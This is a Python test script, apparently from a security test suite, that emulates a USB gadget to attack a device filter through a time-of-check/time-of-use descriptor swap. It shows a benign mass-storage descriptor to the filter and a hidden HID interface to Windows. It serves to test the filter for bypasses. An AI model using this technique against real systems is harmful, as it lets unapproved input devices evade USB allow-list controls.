#!/usr/bin/env python3
"""Attack #10: descriptor TOCTOU.

Serve a BENIGN configuration descriptor to the filter's two
GET_DESCRIPTOR(CONFIGURATION) requests (header, then full body), then a
MALICIOUS one (adds an HID interface) to every later request from Windows'
enumeration.

Run on the server (root), bound to a software UDC, then export the UDC over
USB/IP and attach from Windows with a policy that allows ONLY mass_storage.

Desired outcome: Windows must NOT end up with an HID interface the filter never
evaluated. If it does, that is a real bypass -> file it.
"""

from __future__ import annotations

import usb_descriptors as d
from _raw_gadget import GET_DESCRIPTOR, ControlRequest
from _runner import run_profile

VID, PID = 0x16C0, 0x03F0

_config_request_count = 0


def on_control(req: ControlRequest) -> bytes | None:
    global _config_request_count

    if req.bRequest == GET_DESCRIPTOR and req.descriptor_type == d.DT_DEVICE:
        # Device class 0x00 => "defined at interface level" so the filter relies
        # on the (lied-about) configuration descriptor.
        return d.device_descriptor(vid=VID, pid=PID, b_device_class=0x00)

    if req.bRequest == GET_DESCRIPTOR and req.descriptor_type == d.DT_CONFIG:
        _config_request_count += 1
        benign = d.benign_mass_storage_config()

        # device_filter.cpp first requests the fixed-size configuration header,
        # reads wTotalLength, and then requests that complete descriptor. Both
        # responses form the snapshot evaluated by the filter. Mutating the
        # second response would merely make the filter see HID and deny normally;
        # it would not exercise the filter-to-Windows TOCTOU boundary.
        if _config_request_count == 1:
            if req.wLength != 9:
                raise RuntimeError(
                    "expected filter configuration-header request of 9 bytes, "
                    f"got {req.wLength}")
            print("[toctou] serving BENIGN config header to filter fetch #1")
            return benign
        if _config_request_count == 2:
            if req.wLength != len(benign):
                raise RuntimeError(
                    "expected filter full-configuration request of "
                    f"{len(benign)} bytes, got {req.wLength}")
            print("[toctou] serving BENIGN full config to filter fetch #2")
            return benign

        print(f"[toctou] serving MALICIOUS config (ms+hid) to Windows fetch "
              f"#{_config_request_count}")
        return d.malicious_ms_plus_hid_config()

    return None  # STALL everything else


if __name__ == "__main__":
    run_profile("toctou", on_control, vid=VID, pid=PID)
